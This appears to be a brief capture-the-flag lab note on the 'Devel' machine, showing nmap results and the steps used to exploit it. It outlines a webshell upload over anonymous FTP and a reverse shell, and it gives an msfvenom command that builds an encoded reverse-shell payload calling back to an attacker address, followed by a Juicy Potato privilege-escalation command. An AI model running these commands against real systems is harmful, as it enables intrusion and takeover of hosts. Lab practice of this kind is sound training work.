# Devel

### Nmap

```
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
```

### Exploitation & Priv Esc

```bash
#exploitation
# upload asp webshell through ftp
# run powershell oneliner to get reverse shell
# download nc.exe to obtain a stable shell

# PE
# create payload
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.19 LPORT=10000 -e x86/shikata_ga_nai -f exe -o payload.exe

# get shell
.\Juicy.Potato.x86.exe -p C:\windows\temp\payload.exe -l 10000 -t * -c {6d18ad12-bde3-4393-b311-099c346e6df9}
```
